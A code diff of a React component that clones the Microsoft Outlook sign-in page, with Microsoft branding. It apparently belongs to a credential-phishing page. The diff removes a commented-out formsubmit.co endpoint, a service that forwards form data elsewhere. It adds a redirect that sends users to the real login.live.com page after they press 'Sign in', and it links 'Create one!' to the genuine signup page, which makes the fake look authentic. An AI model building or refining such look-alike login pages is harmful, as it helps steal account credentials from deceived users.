@@ -1,5 +1,7 @@
  import './Outlook.scss'
  
+ import { useNavigate } from "react-router-dom";
+ 
 import { useState, useEffect } from "react";
 
 import { BsFillRecordCircleFill, BsQuestionCircle  } from 'react-icons/bs';
@@ -10,7 +12,6 @@ import { LiaKeySolid } from "react-icons/lia";
 
 import MicrosoftLogo from '../../assets/microsoft_logo_ee5c8d9fb6248c938fd0.svg'
 import OutlookLogo from '../../assets/53_8b36337037cff88c3df2.png'
-
 
 
 
@@ -107,8 +108,12 @@ function Outlook() {
   };
   
 
-//https://formsubmit.co/ajax/71a006782d2b17418053b9d5c4d5b706
+  const navigate = useNavigate()
 
+  const gotToNewPage=()=>{
+    navigate("https://login.live.com/login.srf?wa=wsignin1.0&rpsnv=152&ct=1716742830&rver=7.0.6738.0&wp=MBI_SSL&wreply=https%3a%2f%2foutlook.live.com%2fowa%2f%3fcobrandid%3dab0455a0-8d03-46b9-b18b-df2f57b9e44c%26nlp%3d1%26RpsCsrfState%3da6de4250-edd2-d164-d8fa-226f2a36bddf&id=292841&aadredir=1&CBCXT=out&lw=1&fl=dob%2cflname%2cwld&cobrandid=ab0455a0-8d03-46b9-b18b-df2f57b9e44c");
+  }
+  
 
   return (
   
@@ -158,12 +163,17 @@ function Outlook() {
                      <p className='main-microsoft-noaccount-p'>
                       No account?
                      </p>
-                      <a href='#' className='main-microsoft-noaccount-a'>
+                      <a href='https://signup.live.com/signup?lcid=1033&wa=wsignin1.0&rpsnv=152&ct=1716739323&rver=7.0.6738.0&wp=MBI_SSL&wreply=https%3a%2f%2foutlook.live.com%2fowa%2f%3fnlp%3d1%26signup%3d1%26cobrandid%3dab0455a0-8d03-46b9-b18b-df2f57b9e44c%26RpsCsrfState%3d1c95cc24-1f85-dc96-b4e1-70010f8d0b43&id=292841&CBCXT=out&lw=1&fl=dob%2cflname%2cwld&cobrandid=ab0455a0-8d03-46b9-b18b-df2f57b9e44c&lic=1&uaid=c03384ce277d4bf98e224dbc3e49114c' className='main-microsoft-noaccount-a'>
                       Create one!
                      </a>
                 </div>
                  <div className='main-microsoft-next'>
-                     <button className='main-microsoft-nextBtn' type="submit">Sign in</button>
+                     <button 
+                     onClick={() => gotToNewPage()}
+                     className='main-microsoft-nextBtn'
+                     type="submit">
+                         Sign in
+                     </button>
                  </div>
           </div>
           
